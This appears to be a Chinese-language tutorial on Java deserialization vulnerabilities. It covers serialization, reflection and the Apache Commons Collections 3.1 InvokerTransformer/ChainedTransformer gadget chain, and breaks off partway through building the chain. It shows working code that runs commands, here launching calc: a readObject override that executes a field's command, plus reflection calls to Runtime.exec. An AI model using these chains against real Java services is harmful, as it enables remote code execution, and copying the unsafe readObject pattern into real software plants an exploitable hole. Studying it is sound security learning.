# Java反序列化漏洞原理解析
## Java序列化与反序列化
### 序列化与反序列化过程
Java 序列化是指把 Java 对象转换为字节序列的过程  
ObjectOutputStream类的 writeObject() 方法可以实现序列化
Java 反序列化是指把字节序列恢复为 Java 对象的过程  
ObjectInputStream 类的 readObject() 方法用于反序列化。
实现java.io.Serializable接口才可被反序列化，而且所有属性必须是可序列化的  
(用transient关键字修饰的属性除外，不参与序列化过程)  
**需要序列化的类**
    package serialize;
    import java.io.Serializable;
    public class User implements Serializable{
        private String name;
        public void setName(String name) {
            this.name=name;
        }
        public String getName() {
            return name;
        }
    }
**序列化和反序列化**
    package serialize;
    import java.io.*;
    public class Main {
        public static void main(String[] args) throws Exception {
            User user=new User();
            user.setName("leixiao");
            byte[] serializeData=serialize(user);
            FileOutputStream fout = new FileOutputStream("user.bin");
            fout.write(serializeData);
            fout.close();
            User user2=(User) unserialize(serializeData);
            System.out.println(user2.getName());
        }
        public static byte[] serialize(final Object obj) throws Exception {
            ByteArrayOutputStream btout = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(btout);
            objOut.writeObject(obj);
            return btout.toByteArray();
        }
        public static Object unserialize(final byte[] serialized) throws Exception {
            ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
            ObjectInputStream objIn = new ObjectInputStream(btin);
            return objIn.readObject();
        }
    }
运行结果  
写到文件的便是该对象序列化后的二进制数据  
### readObject()方法
特地提到这个方法是因为在反序列化漏洞中它起到了关键作用，readObject()方法被重写的的话，反序列化该类时调用便是重写后的readObject()方法。如果该方法书写不当的话就有可能引发恶意代码的执行，如
    package evilSerialize;
    import java.io.*;
    public class Evil implements Serializable{
        public String cmd;
        private void readObject(java.io.ObjectInputStream stream) throws Exception {
            stream.defaultReadObject();
            Runtime.getRuntime().exec(cmd);
        }
    }
    package evilSerialize;
    import java.io.*;
    public class Main {
        public static void main(String[] args) throws Exception {
            Evil evil=new Evil();
            evil.cmd="calc";
            byte[] serializeData=serialize(evil);
            unserialize(serializeData);
        }
        public static byte[] serialize(final Object obj) throws Exception {
            ByteArrayOutputStream btout = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(btout);
            objOut.writeObject(obj);
            return btout.toByteArray();
        }
        public static Object unserialize(final byte[] serialized) throws Exception {
            ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
            ObjectInputStream objIn = new ObjectInputStream(btin);
            return objIn.readObject();
        }
    }
但肯定不会有程序员写出这样的代码，所以往往实际中反序列化漏洞的构造比较复杂，而且需要借助Java的一些特性如Java的反射
## Java反射
### Java反射定义
对于任意一个类，都能够得到这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。
其实在Java中定义的一个类本身也是一个对象，即java.lang.Class类的实例，这个实例称为类对象
  * 类对象表示正在运行的 Java 应用程序中的类和接口
  * 类对象没有公共构造方法，由 Java 虚拟机自动构造
  * 类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法
要得到类的方法和属性，首先就要得到该类对象
### 获取类对象
假设现在有一个User类
    package reflection;
    public class User {
        private String name;
        public User(String name) {
            this.name=name;
        }
        public void setName(String name) {
            this.name=name;
        }
        public String getName() {
            return name;
        }
    }
要获取该类对象一般有三种方法
  * class.forName("reflection.User")
  * User.class
  * new User().getClass()  
最常用的是第一种，通过一个字符串即类的全路径名就可以得到类对象，另外两种方法依赖项太强
### 利用类对象创建对象
与new直接创建对象不同，反射是先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象
    package reflection;
    import java.lang.reflect.*;
    public class CreateObject {
        public static void main(String[] args) throws Exception {
            Class UserClass=Class.forName("reflection.User");
            Constructor constructor=UserClass.getConstructor(String.class);
            User user=(User) constructor.newInstance("leixiao");
            System.out.println(user.getName());
        }
    }
方法 | 说明  
---|---  
getConstructor(Class... parameterTypes) | 获得该类中与参数类型匹配的公有构造方法  
getConstructors() | 获得该类的所有公有构造方法  
getDeclaredConstructor(Class... parameterTypes) | 获得该类中与参数类型匹配的构造方法  
getDeclaredConstructors() | 获得该类所有构造方法  
### 通过反射调用方法
    package reflection;
    import java.lang.reflect.*;
    public class CallMethod {
        public static void main(String[] args) throws Exception {
            Class UserClass=Class.forName("reflection.User");
            Constructor constructor=UserClass.getConstructor(String.class);
            User user=(User) constructor.newInstance("leixiao");
            Method method = UserClass.getDeclaredMethod("setName", String.class);
            method.invoke(user, "l3yx");
            System.out.println(user.getName());
        }
    }
方法 | 说明  
---|---  
getMethod(String name, Class... parameterTypes) | 获得该类某个公有的方法  
getMethods() | 获得该类所有公有的方法  
getDeclaredMethod(String name, Class... parameterTypes) | 获得该类某个方法  
getDeclaredMethods() | 获得该类所有方法  
### 通过反射访问属性
    package reflection;
    import java.lang.reflect.*;
    public class AccessAttribute {
        public static void main(String[] args) throws Exception {
            Class UserClass=Class.forName("reflection.User");
            Constructor constructor=UserClass.getConstructor(String.class);
            User user=(User) constructor.newInstance("leixiao");
            Field field= UserClass.getDeclaredField("name");
            field.setAccessible(true);// name是私有属性，需要先设置可访问
            field.set(user, "l3yx");
            System.out.println(user.getName());
        }
    }
方法 | 说明  
---|---  
getField(String name) | 获得某个公有的属性对象  
getFields() | 获得所有公有的属性对象  
getDeclaredField(String name) | 获得某个属性对  
getDeclaredFields() | 获得所有属性对象  
### 利用java反射执行代码
    package reflection;
    public class Exec {
        public static void main(String[] args) throws Exception {
            //java.lang.Runtime.getRuntime().exec("calc.exe");
            Class runtimeClass=Class.forName("java.lang.Runtime");
            Object runtime=runtimeClass.getMethod("getRuntime").invoke(null);// getRuntime是静态方法，invoke时不需要传入对象
            runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");
        }
    }
以上代码中,利用了Java的反射机制把我们的代码意图都利用字符串的形式进行体现，使得原本应该是字符串的属性，变成了代码执行的逻辑，而这个机制也是后续的漏洞使用的前提
## JAVA Apache-CommonsCollections3.1 反序列化RCE漏洞分析
该漏洞组件下载地址  
Java开发过程中常使用一些公共库。Apache Commons Collections提供了很多强有力的数据结构类型并且实现了各种集合工具类
Apache Commons Collections 反序列化 RCE
漏洞问题主要是由于其中的InvokerTransformer类可以通过Java的反射机制来调用任意函数，再配合其他类的包装最终完成反序列化漏洞
InvokerTransformer类的transform方法  
在transform方法中传入了一个对象，然后通过反射调用了iMethodName方法，参数是iArgs
而方法名，参数类型，参数值都可通过构造函数传入  
那么借助InvokerTransformer可像这样执行命令
    package invokerTransformerDemo;
    import org.apache.commons.collections.functors.InvokerTransformer;
    public class InvokerTransformerDemo {
        public static void main(String[] args) throws Exception {
            //Class runtimeClass=Class.forName("java.lang.Runtime");
            //Object runtime=runtimeClass.getMethod("getRuntime").invoke(null);
            //runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");
            Class runtimeClass=Class.forName("java.lang.Runtime");// Runtime的类对象
            //借助InvokerTransformer调用runtimeClass的getMethod方法,参数是getRuntime,最后返回的其实是一个Method对象即getRuntime方法
            Object m_getMethod=new InvokerTransformer("getMethod",new Class[] {
                    String.class,Class[].class},new Object[] {
                    "getRuntime",null
                    }
            ).transform(runtimeClass);
            //借助InvokerTransformer调用m_getMethod的invoke方法,没有参数,最后返回的其实是runtime这个对象
            Object runtime=new InvokerTransformer("invoke",new Class[] {
                    Object.class,Object[].class},new Object[] {
                    null,null
                    }
            ).transform(m_getMethod);
            //借助InvokerTransformer调用runtime的exec方法,参数为calc.exe,返回的自然是一个Process对象
            Object exec=new InvokerTransformer("exec",new Class[] {
                    String.class},new Object[] {
                    "calc.exe"
                    }
            ).transform(runtime);
        }
    }
然后还需要了解的是ConstantTransformer类的transform方法  
代码很简单就是返回iConstant  
而iConstant在构造函数传入  
再看一个比较关键的类ChainedTransformer，首先是其构造函数  
可见传入的是一个Transformer的数组，并赋给iTransformers
然后它的transform方法  
调用了iTransformers中每个Transformer的transform方法，并且将每次的返回值作为了下一个Transformer的参数
那么修改下之前借助InvokerTransformer执行命令的代码，可写出如下反射链
    package reflectionChain;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    public class ReflectionChain {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers=new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[] {
                            String.class,Class[].class},new Object[] {
                            "getRuntime",null
                            }
                    ),
                    new InvokerTransformer("invoke",new Class[] {
                            Object.class,Object[].class},new Object[] {
                            null,null